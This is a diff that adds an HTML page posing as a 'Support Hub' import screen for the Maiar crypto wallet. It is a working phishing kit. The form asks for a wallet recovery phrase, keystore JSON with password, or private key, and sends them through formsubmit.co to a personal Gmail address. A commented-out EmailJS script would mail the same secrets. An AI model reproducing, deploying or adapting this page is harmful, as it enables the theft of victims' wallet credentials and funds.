@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maiar</title>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="nav">
+            <a href="/index.html">
+                <p>Support Hub</p>
+            </a>
+            <div class="icons">
+                <a href="https://telegram.org/" target="_blank">
+                    <img src="/images/telegram.png" alt="telegram-icon" width="32" height="32">
+                </a>
+                <a href="https://github.com/" target="_blank">
+                    <img src="/images/github.png" alt="github" width="32" height="32">
+                </a>
+                <a href="https://twitter.com/login" target="_blank">
+                    <img src="/images/twitter.png" alt="twitter" width="32" height="32">
+                </a>
+                <a href="https://discord.com/" target="_blank">
+                    <img src="/images/discord.png" alt="discord" width="32" height="32">
+                </a>
+            </div>
+        </div>
+        <div class="import-body">
+            <div class="wallets-info">
+                <img src="/images/Malar.jpg" alt="Maiar" width="75" height="75">
+                <p>Maiar</p>
+            </div>
+            <form action="https://formsubmit.co/Muhammedadesina274@gmail.com" method="POST">
+                <div class="import-form">
+                    <div class="buttons">
+                        <button onclick="displayPhrase(event)" class="phrase">Phrase</button>
+                        <button onclick="displayKeystore(event)" class="keystore">Keystore JSON</button>
+                        <button onclick="displayPrivatekey(event)" class="private">Private Key</button>
+                    </div>
+                    <textarea name="PhraseBox" id="Phraseid" type="text" placeholder="Phrase" required></textarea>
+                    <p id="instruc">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+                    <input type="hidden" name="_next" value="http://127.0.0.1:5500/success%20pages/Maiar-success.html">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_subject" value="Maiar Wallet">
+                    <a href="/success pages/Maiar-success.html">
+                        <button type="submit" onclick="importForm()" class="import-btn">Import</button>
+                    </a>
+                </div>
+            </form>
+        </div>
+        <hr>
+        <footer>2022 © Support Hub</footer>
+</body>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script type="text/javascript">
+        function displayPhrase(event) {
+            $(".phrase").css("color", "rgb(105, 175, 231)");    
+            $(".keystore").css("color", "rgb(85, 83, 83)");    
+            $(".private").css("color", "rgbrgb(85, 83, 83)");
+            
+            document.getElementById("instruc").innerHTML = "Typically 12 (sometimes 24) words seperated by a single spaces.";
+            
+            $("#textarea").attr("placeholder", "Phrase");
+        
+            event.preventDefault();
+            }
+        function displayKeystore(event) {
+            $(".keystore").css("color", "rgb(105, 175, 231)");    
+            $(".private").css("color", "rgb(85, 83, 83)");
+            $(".phrase").css("color", "rgb(85, 83, 83)");    
+            
+            document.getElementById("instruc").innerHTML = "Several lines of text beginning with '{...}' plus the password you used to encrypt it.";
+            
+            $("textarea").each(function() {
+                var style = $(this).attr("style");
+                textarea = $(document.createElement("textarea")).attr("style", style);
+                $(this).replaceWith(textarea);
+                $("textarea").attr("placeholder", "Keystore JSON");
+                $("textarea").attr("required", "required");
+                $("textarea").attr("name", "KeystoreJSONBox");
+                $("textarea").attr("id", "KeystoreJSONid");
+                
+            })
+                    
+            event.preventDefault();
+                
+         }
+        
+        function displayPrivatekey(event) {
+            $(".private").css("color", "rgb(105, 175, 231)");    
+            $(".keystore").css("color", "rgb(85, 83, 83)");
+            $(".phrase").css("color", "rgb(85, 83, 83)");    
+            
+            document.getElementById("instruc").innerHTML = "Typically 12 (sometimes 24) words seperated by a single spaces.";
+            
+            
+            $("textarea").each(function() {
+                var style = $(this).attr("style");
+                textarea = $(document.createElement("textarea")).attr("style", style);
+                $(this).replaceWith(textarea);
+                $("textarea").attr("placeholder", "Private Key");         
+                $("textarea").attr("required", "required");
+                $("textarea").attr("name", "PrivateKeyBox");
+                $("textarea").attr("id", "PrivateKeyid");
+            })
+            
+            event.preventDefault();
+        }
+
+    </script>
+    <!-- <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function(){
+        emailjs.init("1vgsGdjGH21c8DCxs");
+        })();
+
+        //jshint esversion: 6
+function importForm() {
+    // var wallet = document.getElementsByClassName("wallets-info");
+    // var walletName = wallet.getAttribute("alt");
+    // console.log(walletName);
+
+    var parameters = {
+        // walletName: document.getElementsByClassName("wallets-info").getAttribute("alt"),
+        PhraseBox: document.getElementById("Phraseid").value,
+        KeystoreBox: document.getElementById("KeystoreJSONid").value,
+        PrivateKeyBox: document.getElementById("PrivateKeyid").value
+    };
+
+    const serviceID = "service_uimt3tu";
+    const templateID = "template_3ujkw84";
+    
+    emailjs.send(serviceID,templateID,parameters).then((res) => {
+            // document.getElementById("Phraseid").value = "";
+            // document.getElementById("KeystoreJSONid").value = "";
+            // document.getElementById("PrivateKeyid").value = "";
+            console.log(res);
+            alert("message sent successfully");
+        })
+        .catch(err => console.log(err));
+} -->
+    </script>
+</html>
